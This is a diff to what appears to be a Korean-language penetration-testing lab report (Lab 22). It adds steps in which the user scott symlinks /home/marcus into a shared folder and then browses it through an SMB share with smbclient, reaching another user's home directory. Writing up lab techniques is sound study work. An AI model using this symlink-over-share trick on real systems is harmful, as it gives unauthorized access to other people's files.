@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T04:36:28.173Z
+modified: 2026-11-20T04:41:38.804Z
 tags:
   - pentest
   - linux
@@ -460,10 +460,30 @@ drwxr-x--- 2 scott scott 4096 Oct  9  2025 /srv/projects
 drwxr-xr-x 2 scott scott 4096 Oct  9  2025 /srv/transfer
 ```
 
-```
-```
+![[Template/Image/Pasted image 20261120133747.png]]
 
 ```
+scott@abducted:~$ ln -s /home/marcus /srv/transfer/marcus
+scott@abducted:~$ ls -al /srv/transfer
+total 8
+drwxr-xr-x 2 scott scott 4096 Nov 20 04:35 .
+drwxr-xr-x 4 root  root  4096 Mar 31  2025 ..
+lrwxrwxrwx 1 scott scott   12 Nov 20 04:35 marcus -> /home/marcu
+```
+
+![[Template/Image/Pasted image 20261120134119.png]]
+
+```
+└─$ smbclient //10.129.244.177/transfer -U 'scott'
+Password for [WORKGROUP\scott]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Nov 20 13:35:35 2026
+  ..                                  D        0  Fri Nov 20 13:35:35 2026
+  marcus                              D        0  Thu Jun  4 22:47:57 2026
+
+		5768764 blocks of size 1024. 2291196 blocks availab
+
 ```
 
 ```
